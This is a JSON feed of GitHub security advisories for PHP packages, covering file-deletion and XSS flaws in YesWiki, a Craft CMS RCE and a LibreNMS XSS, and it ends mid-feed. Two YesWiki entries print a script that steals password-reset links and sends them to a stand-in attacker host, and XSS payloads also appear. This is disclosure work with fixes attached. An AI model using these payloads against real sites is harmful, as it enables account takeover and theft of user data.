{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for PHP packages hosted at packagist.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/composer.json",
    "description": "Security Advisory for PHP packages hosted at packagist.org on GitHub",
    "items": [
        {
            "content_html": "<h1 id=\"authenticated-arbitrary-file-deletion-in-yeswiki--445\">Authenticated arbitrary file deletion in YesWiki &lt;= 4.4.5</h1>\n<h3 id=\"summary\">Summary</h3>\n<p>It is possible for any authenticated user, through the use of the filemanager to delete any file owned by the user running the FastCGI Process Manager (FPM) on the host without any limitation on the filesystem's scope.</p>\n<p>This Proof of Concept has been performed using the followings:</p>\n<ul>\n<li>YesWiki v4.4.5 (<code>doryphore-dev</code> branch, latest)</li>\n<li>Docker environnment (<code>docker/docker-compose.yml</code>)</li>\n<li>Docker v27.5.0</li>\n<li>Default installation</li>\n</ul>\n<h3 id=\"details\">Details</h3>\n<p>The vulnerability makes use of the <code>filemanager</code> that allows a user to manage files that are attached to a resource when they have owner permission on it. This part of the code is managed in <code>tools/attach/libs/attach.lib.php</code></p>\n<pre><code class=\"language-php\">public function doFileManager($isAction = false)\n{\n    $do = (isset($_GET['do']) &amp;&amp; $_GET['do']) ? $_GET['do'] : '';\n    switch ($do) {\n        case 'restore':\n            $this-&gt;fmRestore();\n            $this-&gt;fmShow(true, $isAction);\n            break;\n        case 'erase':\n            $this-&gt;fmErase();\n            $this-&gt;fmShow(true, $isAction);\n            break;\n        case 'del':\n            $this-&gt;fmDelete();\n            $this-&gt;fmShow(false, $isAction);\n            break;\n        case 'trash':\n            $this-&gt;fmShow(true, $isAction);\n            break;\n        case 'emptytrash':\n            $this-&gt;fmEmptyTrash(); //pas de break car apres un emptytrash =&gt; retour au gestionnaire\n            // no break\n        default:\n            $this-&gt;fmShow(false, $isAction);\n    }\n}\n</code></pre>\n<p>The <strong><a href=\"https://github.com/YesWiki/yeswiki/blob/doryphore-dev/tools/attach/libs/attach.lib.php#L999\">fmErase()</a></strong> function doesn't sanitize or verify the path that has been provided by the user in any way. Thus allowing a malicious user to specify any arbitrary file on the filesystem and having it deleted through the use of <code>unlink()</code> (as long as the user that runs the process has permission to delete it).</p>\n<pre><code class=\"language-php\">public function fmErase()\n{\n    $path = $this-&gt;GetUploadPath();\n    $filename = $path . '/' . ($_GET['file'] ? $_GET['file'] : '');\n    if (file_exists($filename)) {\n        unlink($filename);\n    }\n}\n</code></pre>\n<p>In addition to this deletion accross all the filesystem through <code>fmErase()</code>, it is also possible to delete any file attached to an existing wiki page, for instance, if user A creates a page and attaches images/documents to it, they always get uploaded to the files/ directory. If user B (malicious), knows the path of the files he can also arbitrarly delete them. (<strong><a href=\"https://github.com/YesWiki/yeswiki/blob/doryphore-dev/tools/attach/libs/attach.lib.php#L1011\">fmDelete()</a></strong> is also impacted by this case)</p>\n<h3 id=\"poc\">PoC</h3>\n<h4 id=\"1-environnement-setup\">1. Environnement setup</h4>\n<blockquote>\n<p>The following actions have been performed as a privileged user</p>\n</blockquote>\n<p>First, let's create one user (in addition to the WikiAdmin user):</p>\n<p><img alt=\"poc1\" src=\"https://github.com/user-attachments/assets/f977106e-0618-4594-a673-14840ed6cb83\"></p>\n<p>Restrict the edition of 'PagePrincipale' wiki page to administrators only:</p>\n<p><img alt=\"poc2\" src=\"https://github.com/user-attachments/assets/c40c43dd-1b4f-48fc-b425-9d7915c626bc\"></p>\n<h4 id=\"2-upload-of-a-file-on-a-resource-not-owned-by-our-user\">2. Upload of a file on a resource not owned by our user</h4>\n<blockquote>\n<p>The following actions have been performed as a privileged user</p>\n</blockquote>\n<p>Second, let's upload a media to this <code>PagePrincipale</code> wiki page:</p>\n<p><img alt=\"poc3\" src=\"https://github.com/user-attachments/assets/da1cf714-34d6-4d06-8768-f6e0984172fe\">\n<img alt=\"poc4\" src=\"https://github.com/user-attachments/assets/3391986d-8d65-4ed0-b614-b71e9938846e\"></p>\n<p>Then view it in the page's filemanager:</p>\n<p><img alt=\"poc5\" src=\"https://github.com/user-attachments/assets/821bb42c-9cb7-4209-82ac-a5884cc57eb4\"></p>\n<p>We can confirm that our file has been uploaded to the <code>files/</code> directory by directly looking at the <code>yeswiki</code> container:</p>\n<p><img alt=\"poc5 1\" src=\"https://github.com/user-attachments/assets/629c88c5-744a-4203-b017-03abded00ca5\"></p>\n<h4 id=\"3-arbitrary-deletion-in-files\">3. Arbitrary deletion (in files/)</h4>\n<blockquote>\n<p>The following actions have been performed using an unprivileged user</p>\n</blockquote>\n<p>Now, get the full path/name of the media in the files directory by opening it in a new tab:</p>\n<p><img alt=\"poc6\" src=\"https://github.com/user-attachments/assets/43cdc5f6-5e05-4797-91d8-3bed0142d72a\"></p>\n<p>Afterwards, we need an instance of filemanager to be accessible to our user so we need to create a page that we own, here is used the agenda and the creation of a new event:</p>\n<p><img alt=\"poc7\" src=\"https://github.com/user-attachments/assets/1ef17353-04d0-42c8-8a80-dc9f10ca7f80\"></p>\n<p>Call the <code>erase</code> method on the PagePrincipale's uploaded media:</p>\n<p><img alt=\"poc\" src=\"https://github.com/user-attachments/assets/9d05fe78-a8ec-4835-b480-297d0f8fc037\"></p>\n<p>The media is now deleted from PagePrincipale (the button is shown when the attached media doesn't exist, it's an intended behaviour):</p>\n<p><img alt=\"poc9\" src=\"https://github.com/user-attachments/assets/5d20ae80-0eaa-48c1-8411-fd1c5632f524\"></p>\n<p>It has also disappeared from the <code>files/</code> directory:</p>\n<p><img alt=\"poc10\" src=\"https://github.com/user-attachments/assets/a6b3e305-ec4f-4ffb-b5df-34bfddf198b3\"></p>\n<p>This behaviour can be applied to <strong>any</strong> file under the <code>files/</code> directory.</p>\n<h4 id=\"4-arbitrary-deletion-in-tmp\">4. Arbitrary deletion (in /tmp/)</h4>\n<blockquote>\n<p>The following actions have been performed using a privileged access</p>\n</blockquote>\n<p>Finally, using the same user as the process running the app, we create a file under the <code>/tmp</code> directory:</p>\n<p><img alt=\"poc11\" src=\"https://github.com/user-attachments/assets/45befa45-1023-4aed-b55a-f49864eb2174\"></p>\n<blockquote>\n<p>The following actions have been performed using an unprivileged user</p>\n</blockquote>\n<p>We can once again call the <code>erase</code> method using a relative path:</p>\n<p><img alt=\"poc3\" src=\"https://github.com/user-attachments/assets/b9ee7d19-5f2c-4de3-9a8d-5049c2480d3e\"></p>\n<p>The file isn't here anymore:</p>\n<p><img alt=\"poc13\" src=\"https://github.com/user-attachments/assets/1ec440b6-cc95-40b5-b061-22fc46b8ae67\"></p>\n<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability allows any authenticated user to arbitrarly remove content from the Wiki resulting in partial loss of data and defacement/deteroriation of the website. In the context of a container installation of YesWiki without any modification, the 'yeswiki' files (for example .php) are not owned by the same user (root) as the one running the FPM process (www-data). However in a standard installation, www-data may also be the owner of the PHP files, allowing a malicious user to completely cut the access to the wiki by deleting all important PHP files (like index.php or core files of YesWiki).</p>\n<h3 id=\"suggestion-of-possible-corrective-measures\">Suggestion of possible corrective measures</h3>\n<ul>\n<li><p>Restrict the possible paths of <code>fmErase()</code> to the <code>upload_path</code> directory.</p>\n</li>\n<li><p>Restrict the use of <code>fmErase()</code> to trashed files only.</p>\n</li>\n</ul>\n<pre><code class=\"language-php\">public function fmErase()\n{\n    $path = $this-&gt;GetUploadPath();\n    $filename = $this-&gt;GetUploadPath() . '/' . basename(realpath(($_GET['file'] ? $_GET['file'] : ''))); //Sanitize file path\n    if (file_exists($filename) &amp;&amp; preg_match('/trash\\d{14}$/', $filename)) { //Make sure that the filename ends with trash and a date\n        unlink($filename);\n    }\n}\n</code></pre>\n<ul>\n<li>Make sure that any request to <code>fmErase()</code> or <code>fmDelete()</code> originates from the owner of the resource to which the attachment is linked (asks a bit more than a few lines of code).</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/YesWiki/yeswiki/security/advisories/GHSA-43c9-gw4x-pcx6\">https://github.com/YesWiki/yeswiki/security/advisories/GHSA-43c9-gw4x-pcx6</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-24019\">https://nvd.nist.gov/vuln/detail/CVE-2025-24019</a></li>\n<li><a href=\"https://github.com/YesWiki/yeswiki/commit/3ddd833d22703caf9025659eb174f7765df7147c\">https://github.com/YesWiki/yeswiki/commit/3ddd833d22703caf9025659eb174f7765df7147c</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-43c9-gw4x-pcx6\">https://github.com/advisories/GHSA-43c9-gw4x-pcx6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-43c9-gw4x-pcx6",
            "title": "[yeswiki/yeswiki] Authenticated arbitrary file deletion in YesWiki",
            "date_modified": "2025-01-21T20:11:39.000Z",
            "date_published": "2025-01-21T20:11:37.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-43c9-gw4x-pcx6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"authenticated-stored-xss-in-yeswiki--445\">Authenticated Stored XSS in YesWiki &lt;= 4.4.5</h1>\n<h3 id=\"summary\">Summary</h3>\n<p>It is possible for an authenticated user with rights to edit/create a page or comment to trigger a stored XSS which will be reflected on any page where the resource is loaded.</p>\n<p>This Proof of Concept has been performed using the followings:</p>\n<ul>\n<li>YesWiki v4.4.5 (<code>doryphore-dev</code> branch, latest)</li>\n<li>Docker environnment (<code>docker/docker-compose.yml</code>)</li>\n<li>Docker v27.5.0</li>\n<li>Default installation</li>\n</ul>\n<h3 id=\"details\">Details</h3>\n<p>The vulnerability makes use of the content edition feature and more specifically of the <code>{{attach}}</code> component allowing users to attach files/medias to a page. When a file is attached using the <code>{{attach}}</code> component, if the resource contained in the <code>file</code> attribute doesn't exist, then the server will generate a file upload button containing the filename. </p>\n<p>This part of the code is managed in <code>tools/attach/libs/attach.lib.php</code> and the faulty function is <strong><a href=\"https://github.com/YesWiki/yeswiki/blob/doryphore-dev/tools/attach/libs/attach.lib.php#L660\">showFileNotExits()</a></strong>.</p>\n<pre><code class=\"language-php\">public function showFileNotExits()\n{\n    echo '&lt;a href=\"' . $this-&gt;wiki-&gt;href('upload', $this-&gt;wiki-&gt;GetPageTag(), \"file=$this-&gt;file\") . '\" class=\"btn btn-primary\"&gt;&lt;i class=\"fa fa-upload icon-upload icon-white\"&gt;&lt;/i&gt; ' . _t('UPLOAD_FILE') . ' ' . $this-&gt;file . '&lt;/a&gt;';\n}\n</code></pre>\n<p>The file name attribute is not properly sanitized when returned to the client, therefore allowing the execution of malicious JavaScript code in the client's browser.</p>\n<h3 id=\"poc\">PoC</h3>\n<h4 id=\"1-simple-xss\">1. Simple XSS</h4>\n<p>Here is a working payload <code>{{attach file=\"&lt;script&gt;alert(document.domain)&lt;/script&gt;\" desc=\"\" size=\"original\" class=\" whiteborder zoom\" nofullimagelink=\"1\"}}</code> tha works in pages and comments:</p>\n<p>On a comment:</p>\n<p><img alt=\"poc1\" src=\"https://github.com/user-attachments/assets/dab6b08e-f542-41fd-872d-d221fd228229\">\n<img alt=\"poc2\" src=\"https://github.com/user-attachments/assets/50eff326-df36-482b-be87-c4e3866497cf\"></p>\n<p>On a page:</p>\n<p><img alt=\"poc3\" src=\"https://github.com/user-attachments/assets/e9f4761a-6b7d-4508-aad5-21d4cedcd179\">\n<img alt=\"poc4\" src=\"https://github.com/user-attachments/assets/7945b9bb-bc8e-4e01-86d7-bbba823ba67c\"></p>\n<h4 id=\"2-full-account-takeover-scenario\">2. Full account takeover scenario</h4>\n<p>By changing the payload of the XSS it was possible to establish a full acount takeover through a weak password recovery mechanism abuse (<a href=\"https://cwe.mitre.org/data/definitions/640.html\">CWE-460</a>). The following exploitation script allows an attacker to extract the password reset link of every logged in user that is triggered by the XSS:</p>\n<pre><code class=\"language-javascript\">fetch('/?ParametresUtilisateur')\n  .then(response =&gt; {\n    return response.text();\n  })\n  .then(htmlString =&gt; {\n    const parser = new DOMParser();\n    const doc = parser.parseFromString(htmlString, 'text/html');\n    const resetLinkElement = doc.querySelector('.control-group .controls a'); //dirty\n    fetch('http://attacker.lan:4444/?xss='.concat(btoa(resetLinkElement.href)));\n  })\n</code></pre>\n<p>Posting a comment using this specially crafted payload with a user account:</p>\n<p><img alt=\"poc5\" src=\"https://github.com/user-attachments/assets/7c143b99-a81e-4834-9453-5be067e19521\"></p>\n<p>Allows our administrator account's password reset link to be sent to the listener of the attacker:</p>\n<p><img alt=\"poc7\" src=\"https://github.com/user-attachments/assets/bbf8c3e2-22a6-4a57-bc32-d6ca2e619cb9\">\n<img alt=\"poc8\" src=\"https://github.com/user-attachments/assets/18d5cb6e-5085-4a87-91db-2afebf40c60a\"></p>\n<p>Therefore giving us access to an successful password reset for any account triggering the XSS:</p>\n<p><img alt=\"poc9\" src=\"https://github.com/user-attachments/assets/7e237b92-0bec-4754-b65c-59f70c010ef4\"></p>\n<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability allows any malicious authenticated user that has the right to create a comment or edit a page to be able to steal accounts and therefore modify pages, comments, permissions, extract user data (emails), thus impacting the integrity, availabilty and confidentiality of a YesWiki instance.</p>\n<h3 id=\"suggestion-of-possible-corrective-measures\">Suggestion of possible corrective measures</h3>\n<ul>\n<li>Sanitize properly the filename attribute</li>\n</ul>\n<pre><code class=\"language-php\">public function showFileNotExits()\n{\n    $filename = htmlspecialchars($this-&gt;file);\n    echo '&lt;a href=\"' . $this-&gt;wiki-&gt;href('upload', $this-&gt;wiki-&gt;GetPageTag(), \"file=$filename\") . '\" class=\"btn btn-primary\"&gt;&lt;i class=\"fa fa-upload icon-upload icon-white\"&gt;&lt;/i&gt; ' . _t('UPLOAD_FILE') . ' ' . $filename . '&lt;/a&gt;';\n}\n</code></pre>\n<ul>\n<li><p>Implement a stronger password reset mechanism through:</p>\n<ul>\n<li>Not showing a password reset link to an already logged-in user. </li>\n<li>Generating a password reset link when a reset is requested by a user, and only send it by mail.</li>\n<li>Add an expiration/due date to the token</li>\n</ul>\n</li>\n<li><p>Implement a strong Content Security Policy to mitigate other XSS sinks (preferably using a random nonce)</p>\n<blockquote>\n<p>The latter idea is expensive to develop/implement, but given the number of likely sinks allowing Cross Site Scripting in the YesWiki source code, it seems necessary and easier than seeking for any improperly sanitized user input.</p>\n</blockquote>\n</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/YesWiki/yeswiki/security/advisories/GHSA-w59h-3x3q-3p6j\">https://github.com/YesWiki/yeswiki/security/advisories/GHSA-w59h-3x3q-3p6j</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-24018\">https://nvd.nist.gov/vuln/detail/CVE-2025-24018</a></li>\n<li><a href=\"https://github.com/YesWiki/yeswiki/commit/c1e28b59394957902c31c850219e4504a20db98b\">https://github.com/YesWiki/yeswiki/commit/c1e28b59394957902c31c850219e4504a20db98b</a></li>\n<li><a href=\"https://github.com/YesWiki/yeswiki/blob/v4.4.5/tools/attach/libs/attach.lib.php#L660\">https://github.com/YesWiki/yeswiki/blob/v4.4.5/tools/attach/libs/attach.lib.php#L660</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-w59h-3x3q-3p6j\">https://github.com/advisories/GHSA-w59h-3x3q-3p6j</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-w59h-3x3q-3p6j",
            "title": "[yeswiki/yeswiki] Authenticated Stored XSS in YesWiki",
            "date_modified": "2025-01-21T20:10:50.000Z",
            "date_published": "2025-01-21T20:10:49.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-w59h-3x3q-3p6j"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"unauthenticated-dom-based-xss-in-yeswiki--445\">Unauthenticated DOM Based XSS in YesWiki &lt;= 4.4.5</h1>\n<h3 id=\"summary\">Summary</h3>\n<p>It is possible for any end-user to craft a DOM based XSS on all of YesWiki's pages which will be triggered when a user clicks on a malicious link.</p>\n<p>This Proof of Concept has been performed using the followings:</p>\n<ul>\n<li>YesWiki v4.4.5 (<code>doryphore-dev</code> branch, latest)</li>\n<li>Docker environnment (<code>docker/docker-compose.yml</code>)</li>\n<li>Docker v27.5.0</li>\n<li>Default installation</li>\n</ul>\n<h3 id=\"details\">Details</h3>\n<p>The vulnerability makes use of the search by tag feature. When a tag doesn't exist, the tag is reflected on the page and isn't properly sanitized on the server side which allows a malicious user to generate a link that will trigger an XSS on the client's side when clicked. </p>\n<p>This part of the code is managed by <code>tools/tags/handlers/page/listpages.php</code>, and <strong><a href=\"https://github.com/YesWiki/yeswiki/blob/doryphore-dev/tools/tags/handlers/page/listpages.php#L84\">this piece of code</a></strong> is responsible for the vulnerability:</p>\n<pre><code class=\"language-php\">$output .= '&lt;div class=\"alert alert-info\"&gt;' . \"\\n\";\nif ($nb_total &gt; 1) {\n    $output .= _t('TAGS_TOTAL_NB_PAGES', ['nb_total' =&gt; $nb_total]);\n} elseif ($nb_total == 1) {\n    $output .= _t('TAGS_ONE_PAGE_FOUND');\n} else {\n    $output .= _t('TAGS_NO_PAGE');\n}\n$output .= (!empty($tab_selected_tags) ? ' ' . _t('TAGS_WITH_KEYWORD') . ' ' . implode(' ' . _t('TAGS_WITH_KEYWORD_SEPARATOR') . ' ', array_map(function ($tagName) {\n    return '&lt;span class=\"tag-label label label-info\"&gt;' . $tagName . '&lt;/span&gt;';\n}, $tab_selected_tags)) : '') . '.';\n$output .= $this-&gt;Format('{{rss tags=\"' . $tags . '\" class=\"pull-right\"}}') . \"\\n\";\n$output .= '&lt;/div&gt;' . \"\\n\" . $text;\n\necho $this-&gt;Header();\necho \"&lt;div class=\\\"page\\\"&gt;\\n$output\\n$outputselecttag\\n&lt;hr class=\\\"hr_clear\\\" /&gt;\\n&lt;/div&gt;\\n\";\necho $this-&gt;Footer();\n</code></pre>\n<p>The tag names aren't properly sanitized when adding them to the page's response, thus when a tag name is user controlled, it allows client side code execution. This case describes a case where the tag name doesn't exist, but if an admin creates a malicious tag, it will also end up in XSS when rendered.</p>\n<h3 id=\"poc\">PoC</h3>\n<h4 id=\"1-simple-xss\">1. Simple XSS</h4>\n<p>Abusing the <code>tags</code> parameter, we can successfully obtain client side javascript execution:</p>\n<p><img alt=\"poc1\" src=\"https://github.com/user-attachments/assets/cfd59dd6-ebda-4587-b903-d2777fc7d780\"></p>\n<h4 id=\"2-full-account-takeover-scenario\">2. Full account takeover scenario</h4>\n<p>By changing the payload of the XSS it was possible to establish a full acount takeover through a weak password recovery mechanism abuse (<a href=\"https://cwe.mitre.org/data/definitions/640.html\">CWE-460</a>). The following exploitation script allows an attacker to extract the password reset link of every logged in user that is triggered by the XSS:</p>\n<pre><code class=\"language-javascript\">fetch('/?ParametresUtilisateur')\n  .then(response =&gt; {\n    return response.text();\n  })\n  .then(htmlString =&gt; {\n    const parser = new DOMParser();\n    const doc = parser.parseFromString(htmlString, 'text/html');\n    const resetLinkElement = doc.querySelector('.control-group .controls a'); //dirty\n    fetch('http://attacker.lan:4444/?xss='.concat(btoa(resetLinkElement.href)));\n  })\n</code></pre>\n<p>Hosting this script on a listener, when an admin is tricked into clicking on a maliciously crafted link, we can then reset its password and takeover their account.</p>\n<p><img alt=\"poc2\" src=\"https://github.com/user-attachments/assets/02884697-f0a5-43df-8bab-d83f8c9a102d\">\n<img alt=\"poc3\" src=\"https://github.com/user-attachments/assets/ef5b44f1-97bb-4cf1-a32b-471f8c672ebd\">\n<img alt=\"poc4\" src=\"https://github.com/user-attachments/assets/6a0193a2-1a01-4c65-bd97-f7c900f7f174\"></p>\n<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability allows any user to generate a malicious link that will trigger an account takeover when clicked, therefore allowing a user to steal other accounts, modify pages, comments, permissions, extract user data (emails), thus impacting the integrity, availabilty and confidentiality of a YesWiki instance.</p>\n<h3 id=\"suggestion-of-possible-corrective-measures\">Suggestion of possible corrective measures</h3>\n<ul>\n<li>Sanitize properly the tag names when created <a href=\"https://github.com/YesWiki/yeswiki/blob/doryphore-dev/tools/tags/services/TagsManager.php#L60\">here</a></li>\n</ul>\n<pre><code class=\"language-php\">        foreach ($tags as $tag) {\n            trim($tag);\n            if ($tag != '') {\n                if (!$this-&gt;tripleStore-&gt;exist($page, 'http://outils-reseaux.org/_vocabulary/tag', htmlspecialchars($tag), '', '')) {\n                    $this-&gt;tripleStore-&gt;create($page, 'http://outils-reseaux.org/_vocabulary/tag', htmlspecialchars($tag), '', '');\n                }\n                //on supprime ce tag du tableau des tags restants a effacer\n                if (isset($tags_restants_a_effacer)) {\n                    unset($tags_restants_a_effacer[array_search($tag, $tags_restants_a_effacer)]);\n                }\n            }\n        }\n</code></pre>\n<ul>\n<li>Sanitize the tag names when looked for <a href=\"https://github.com/YesWiki/yeswiki/blob/doryphore-dev/tools/tags/handlers/page/listpages.php#L15\">here</a></li>\n</ul>\n<pre><code class=\"language-php\">//$tags = (isset($_GET['tags'])) ? $_GET['tags'] : '';\n$tags = (isset($_GET['tags'])) ? htmlspecialchars($_GET['tags']) : '';\n</code></pre>\n<ul>\n<li><p>Implement a stronger password reset mechanism through:</p>\n<ul>\n<li>Not showing a password reset link to an already logged-in user. </li>\n<li>Generating a password reset link when a reset is requested by a user, and only send it by mail.</li>\n<li>Add an expiration/due date to the token</li>\n</ul>\n</li>\n<li><p>Implement a strong Content Security Policy to mitigate other XSS sinks (preferably using a random nonce)</p>\n<blockquote>\n<p>The latter idea is expensive to develop/implement, but given the number of likely sinks allowing Cross Site Scripting in the YesWiki source code, it seems necessary and easier than seeking for any improperly sanitized user input.</p>\n</blockquote>\n</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/YesWiki/yeswiki/security/advisories/GHSA-wphc-5f2j-jhvg\">https://github.com/YesWiki/yeswiki/security/advisories/GHSA-wphc-5f2j-jhvg</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-24017\">https://nvd.nist.gov/vuln/detail/CVE-2025-24017</a></li>\n<li><a href=\"https://github.com/YesWiki/yeswiki/commit/c1e28b59394957902c31c850219e4504a20db98b\">https://github.com/YesWiki/yeswiki/commit/c1e28b59394957902c31c850219e4504a20db98b</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wphc-5f2j-jhvg\">https://github.com/advisories/GHSA-wphc-5f2j-jhvg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wphc-5f2j-jhvg",
            "title": "[yeswiki/yeswiki] Unauthenticated DOM Based XSS in YesWiki",
            "date_modified": "2025-01-21T20:08:38.000Z",
            "date_published": "2025-01-21T20:08:37.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wphc-5f2j-jhvg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>This is an RCE vulnerability that affects Craft 4 and 5 installs where your security key has already been compromised.</p>\n<p><a href=\"https://craftcms.com/knowledge-base/securing-craft#keep-your-secrets-secret\">https://craftcms.com/knowledge-base/securing-craft#keep-your-secrets-secret</a></p>\n<p>Anyone running an unpatched version of Craft with a compromised security key is affected.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This has been patched in Craft 5.5.8 and 4.13.8.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If you can't update to a patched version, then rotating your security key and ensuring its privacy will help to migitgate the issue.</p>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://github.com/craftcms/cms/commit/e59e22b30c9dd39e5e2c7fe02c147bcbd004e603\">https://github.com/craftcms/cms/commit/e59e22b30c9dd39e5e2c7fe02c147bcbd004e603</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/craftcms/cms/security/advisories/GHSA-x684-96hh-833x\">https://github.com/craftcms/cms/security/advisories/GHSA-x684-96hh-833x</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-23209\">https://nvd.nist.gov/vuln/detail/CVE-2025-23209</a></li>\n<li><a href=\"https://github.com/craftcms/cms/commit/e59e22b30c9dd39e5e2c7fe02c147bcbd004e603\">https://github.com/craftcms/cms/commit/e59e22b30c9dd39e5e2c7fe02c147bcbd004e603</a></li>\n<li><a href=\"https://craftcms.com/knowledge-base/securing-craft#keep-your-secrets-secret\">https://craftcms.com/knowledge-base/securing-craft#keep-your-secrets-secret</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x684-96hh-833x\">https://github.com/advisories/GHSA-x684-96hh-833x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x684-96hh-833x",
            "title": "[craftcms/cms] Craft CMS has a potential RCE with a compromised security key",
            "date_modified": "2025-01-21T19:48:38.000Z",
            "date_published": "2025-01-21T19:48:38.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x684-96hh-833x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>This is an RCE vulnerability that affects Craft 4 and 5 installs where your security key has already been compromised.</p>\n<p><a href=\"https://craftcms.com/knowledge-base/securing-craft#keep-your-secrets-secret\">https://craftcms.com/knowledge-base/securing-craft#keep-your-secrets-secret</a></p>\n<p>Anyone running an unpatched version of Craft with a compromised security key is affected.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This has been patched in Craft 5.5.8 and 4.13.8.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If you can't update to a patched version, then rotating your security key and ensuring its privacy will help to migitgate the issue.</p>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://github.com/craftcms/cms/commit/e59e22b30c9dd39e5e2c7fe02c147bcbd004e603\">https://github.com/craftcms/cms/commit/e59e22b30c9dd39e5e2c7fe02c147bcbd004e603</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/craftcms/cms/security/advisories/GHSA-x684-96hh-833x\">https://github.com/craftcms/cms/security/advisories/GHSA-x684-96hh-833x</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-23209\">https://nvd.nist.gov/vuln/detail/CVE-2025-23209</a></li>\n<li><a href=\"https://github.com/craftcms/cms/commit/e59e22b30c9dd39e5e2c7fe02c147bcbd004e603\">https://github.com/craftcms/cms/commit/e59e22b30c9dd39e5e2c7fe02c147bcbd004e603</a></li>\n<li><a href=\"https://craftcms.com/knowledge-base/securing-craft#keep-your-secrets-secret\">https://craftcms.com/knowledge-base/securing-craft#keep-your-secrets-secret</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x684-96hh-833x\">https://github.com/advisories/GHSA-x684-96hh-833x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x684-96hh-833x",
            "title": "[craftcms/cms] Craft CMS has a potential RCE with a compromised security key",
            "date_modified": "2025-01-21T19:48:38.000Z",
            "date_published": "2025-01-21T19:48:38.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x684-96hh-833x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>XSS on the parameters:<code>/addhost</code> -&gt; param: community</p>\n<p>of Librenms versions 24.10.1 (<a href=\"https://github.com/librenms/librenms\">https://github.com/librenms/librenms</a>) allows remote attackers to inject malicious scripts. When a user views or interacts with the page displaying the data, the malicious script executes immediately, leading to potential unauthorized actions or data exposure.</p>\n<p><strong>Proof of Concept:</strong></p>\n<ol>\n<li><p>Navigate to the /addhost path.</p>\n</li>\n<li><p>Fill in all required fields.</p>\n</li>\n<li><p>In the Community field, enter the following payload: <code>\"&gt;&lt;img src=a onerror=\"alert(1)\"&gt;</code>.\n<img alt=\"image\" src=\"https://github.com/user-attachments/assets/025a7692-e730-4e3b-bca7-761ed2a60cf7\"></p>\n</li>\n<li><p>Submit the form to save changes.\n5 The script will execute when the error alert \"No reply with community + payload\" appears.\n<img alt=\"image\" src=\"https://github.com/user-attachments/assets/4663e24a-4ff7-42f4-9c3d-3c5b5bf34017\"></p>\n</li>\n</ol>\n<p><strong>Impact:</strong></p>\n<p>Execution of Malicious Code</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/librenms/librenms/security/advisories/GHSA-g84x-g96g-rcjc\">https://github.com/librenms/librenms/security/advisories/GHSA-g84x-g96g-rcjc</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-23201\">https://nvd.nist.gov/vuln/detail/CVE-2025-23201</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g84x-g96g-rcjc\">https://github.com/advisories/GHSA-g84x-g96g-rcjc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g84x-g96g-rcjc",
            "title": "[librenms/librenms] Librenms has a reflected XSS on error alert",
            "date_modified": "2025-01-17T15:52:41.000Z",
            "date_published": "2025-01-16T17:33:10.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g84x-g96g-rcjc"
            },
            "tags": [
                "severity"
            ]
        },
        {
